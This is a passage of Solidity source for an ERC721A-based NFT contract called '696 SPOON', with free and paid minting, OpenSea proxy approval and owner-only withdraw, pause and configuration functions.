1089             _addressData[to].balance += uint64(quantity);
1090             _addressData[to].numberMinted += uint64(quantity);
1091 
1092             _ownerships[startTokenId].addr = to;
1093             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1094 
1095             uint256 updatedIndex = startTokenId;
1096             uint256 end = updatedIndex + quantity;
1097 
1098             if (safe && to.isContract()) {
1099                 do {
1100                     emit Transfer(address(0), to, updatedIndex);
1101                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1102                         revert TransferToNonERC721ReceiverImplementer();
1103                     }
1104                 } while (updatedIndex != end);
1105                 // Reentrancy protection
1106                 if (_currentIndex != startTokenId) revert();
1107             } else {
1108                 do {
1109                     emit Transfer(address(0), to, updatedIndex++);
1110                 } while (updatedIndex != end);
1111             }
1112             _currentIndex = updatedIndex;
1113         }
1114         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1115     }
1116 
1117     /**
1118      * @dev Transfers `tokenId` from `from` to `to`.
1119      *
1120      * Requirements:
1121      *
1122      * - `to` cannot be the zero address.
1123      * - `tokenId` token must be owned by `from`.
1124      *
1125      * Emits a {Transfer} event.
1126      */
1127     function _transfer(
1128         address from,
1129         address to,
1130         uint256 tokenId
1131     ) private {
1132         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1133 
1134         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1135             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1136             getApproved(tokenId) == _msgSender());
1137 
1138         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1139         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1140         if (to == address(0)) revert TransferToZeroAddress();
1141 
1142         _beforeTokenTransfers(from, to, tokenId, 1);
1143 
1144         // Clear approvals from the previous owner
1145         _approve(address(0), tokenId, prevOwnership.addr);
1146 
1147         // Underflow of the sender's balance is impossible because we check for
1148         // ownership above and the recipient's balance can't realistically overflow.
1149         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1150         unchecked {
1151             _addressData[from].balance -= 1;
1152             _addressData[to].balance += 1;
1153 
1154             _ownerships[tokenId].addr = to;
1155             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1156 
1157             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1158             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1159             uint256 nextTokenId = tokenId + 1;
1160             if (_ownerships[nextTokenId].addr == address(0)) {
1161                 // This will suffice for checking _exists(nextTokenId),
1162                 // as a burned slot cannot contain the zero address.
1163                 if (nextTokenId < _currentIndex) {
1164                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1165                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1166                 }
1167             }
1168         }
1169 
1170         emit Transfer(from, to, tokenId);
1171         _afterTokenTransfers(from, to, tokenId, 1);
1172     }
1173 
1174     /**
1175      * @dev Destroys `tokenId`.
1176      * The approval is cleared when the token is burned.
1177      *
1178      * Requirements:
1179      *
1180      * - `tokenId` must exist.
1181      *
1182      * Emits a {Transfer} event.
1183      */
1184     function _burn(uint256 tokenId) internal virtual {
1185         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1186 
1187         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1188 
1189         // Clear approvals from the previous owner
1190         _approve(address(0), tokenId, prevOwnership.addr);
1191 
1192         // Underflow of the sender's balance is impossible because we check for
1193         // ownership above and the recipient's balance can't realistically overflow.
1194         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1195         unchecked {
1196             _addressData[prevOwnership.addr].balance -= 1;
1197             _addressData[prevOwnership.addr].numberBurned += 1;
1198 
1199             // Keep track of who burned the token, and the timestamp of burning.
1200             _ownerships[tokenId].addr = prevOwnership.addr;
1201             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1202             _ownerships[tokenId].burned = true;
1203 
1204             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1205             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1206             uint256 nextTokenId = tokenId + 1;
1207             if (_ownerships[nextTokenId].addr == address(0)) {
1208                 // This will suffice for checking _exists(nextTokenId),
1209                 // as a burned slot cannot contain the zero address.
1210                 if (nextTokenId < _currentIndex) {
1211                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1212                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1213                 }
1214             }
1215         }
1216 
1217         emit Transfer(prevOwnership.addr, address(0), tokenId);
1218         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1219 
1220         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1221         unchecked {
1222             _burnCounter++;
1223         }
1224     }
1225 
1226     /**
1227      * @dev Approve `to` to operate on `tokenId`
1228      *
1229      * Emits a {Approval} event.
1230      */
1231     function _approve(
1232         address to,
1233         uint256 tokenId,
1234         address owner
1235     ) private {
1236         _tokenApprovals[tokenId] = to;
1237         emit Approval(owner, to, tokenId);
1238     }
1239 
1240     /**
1241      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1242      *
1243      * @param from address representing the previous owner of the given token ID
1244      * @param to target address that will receive the tokens
1245      * @param tokenId uint256 ID of the token to be transferred
1246      * @param _data bytes optional data to send along with the call
1247      * @return bool whether the call correctly returned the expected magic value
1248      */
1249     function _checkContractOnERC721Received(
1250         address from,
1251         address to,
1252         uint256 tokenId,
1253         bytes memory _data
1254     ) private returns (bool) {
1255         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1256             return retval == IERC721Receiver(to).onERC721Received.selector;
1257         } catch (bytes memory reason) {
1258             if (reason.length == 0) {
1259                 revert TransferToNonERC721ReceiverImplementer();
1260             } else {
1261                 assembly {
1262                     revert(add(32, reason), mload(reason))
1263                 }
1264             }
1265         }
1266     }
1267 
1268     /**
1269      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1270      * And also called before burning one token.
1271      *
1272      * startTokenId - the first token id to be transferred
1273      * quantity - the amount to be transferred
1274      *
1275      * Calling conditions:
1276      *
1277      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1278      * transferred to `to`.
1279      * - When `from` is zero, `tokenId` will be minted for `to`.
1280      * - When `to` is zero, `tokenId` will be burned by `from`.
1281      * - `from` and `to` are never both zero.
1282      */
1283     function _beforeTokenTransfers(
1284         address from,
1285         address to,
1286         uint256 startTokenId,
1287         uint256 quantity
1288     ) internal virtual {}
1289 
1290     /**
1291      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1292      * minting.
1293      * And also called after one token has been burned.
1294      *
1295      * startTokenId - the first token id to be transferred
1296      * quantity - the amount to be transferred
1297      *
1298      * Calling conditions:
1299      *
1300      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1301      * transferred to `to`.
1302      * - When `from` is zero, `tokenId` has been minted for `to`.
1303      * - When `to` is zero, `tokenId` has been burned by `from`.
1304      * - `from` and `to` are never both zero.
1305      */
1306     function _afterTokenTransfers(
1307         address from,
1308         address to,
1309         uint256 startTokenId,
1310         uint256 quantity
1311     ) internal virtual {}
1312 }
1313 
1314 
1315 
1316 contract Spoon is ERC721A, Owneable {
1317 
1318     string public baseURI = "https://spoondao.mypinata.cloud/ipfs/QmVPtCyBSA6KcsnZedWAse59pAjJJvei4V7RAcY8wXVGTZ/";
1319     string public contractURI = "https://spoondao.mypinata.cloud/ipfs/QmVPtCyBSA6KcsnZedWAse59pAjJJvei4V7RAcY8wXVGTZ/";
1320     string public constant baseExtension = ".json";
1321     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1322 
1323     uint256 public constant MAX_PER_TX_FREE =1;
1324     uint256 public constant FREE_MAX_SUPPLY = 196;
1325     uint256 public constant MAX_PER_TX = 20;
1326     uint256 public MAX_SUPPLY = 696;
1327     uint256 public price = 0.002 ether;
1328 
1329     bool public paused = false;
1330 
1331     constructor() ERC721A("696 SPOON", "SP") {}
1332 
1333     function mint(uint256 _amount) external payable {
1334         address _caller = _msgSender();
1335         require(!paused, "Paused");
1336         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1337         require(_amount > 0, "No 0 mints");
1338         require(tx.origin == _caller, "No contracts");
1339         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1340         
1341       if(FREE_MAX_SUPPLY >= totalSupply()){
1342             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1343         }else{
1344             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1345             require(_amount * price == msg.value, "Invalid funds provided");
1346         }
1347 
1348 
1349         _safeMint(_caller, _amount);
1350     }
1351 
1352     function isApprovedForAll(address owner, address operator)
1353         override
1354         public
1355         view
1356         returns (bool)
1357     {
1358         // Whitelist OpenSea proxy contract for easy trading.
1359         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1360         if (address(proxyRegistry.proxies(owner)) == operator) {
1361             return true;
1362         }
1363 
1364         return super.isApprovedForAll(owner, operator);
1365     }
1366 
1367     function withdraw() external onlyOwner {
1368         uint256 balance = address(this).balance;
1369         (bool success, ) = _msgSender().call{value: balance}("");
1370         require(success, "Failed to send");
1371     }
1372 
1373     function config() external onlyOwner {
1374         _safeMint(_msgSender(), 1);
1375     }
1376 
1377     function pause(bool _state) external onlyOwner {
1378         paused = _state;
1379     }
1380 
1381     function setBaseURI(string memory baseURI_) external onlyOwner {
1382         baseURI = baseURI_;
1383     }
1384 
1385     function setContractURI(string memory _contractURI) external onlyOwner {
1386         contractURI = _contractURI;
1387     }
1388 
1389     function setPrice(uint256 newPrice) public onlyOwner {
1390         price = newPrice;
1391     }
1392 
1393     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1394         MAX_SUPPLY = newSupply;
1395     }
1396 
1397     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1398         require(_exists(_tokenId), "Token does not exist.");
1399         return bytes(baseURI).length != 0 ? string(
1400             abi.encodePacked(
1401               baseURI,
1402               Strings.toString(_tokenId),
1403               baseExtension
1404             )
1405         ) : "";
1406     }
1407 }
1408 
1409 contract OwnableDelegateProxy { }
1410 contract ProxyRegistry {
1411     mapping(address => OwnableDelegateProxy) public proxies;
1412 }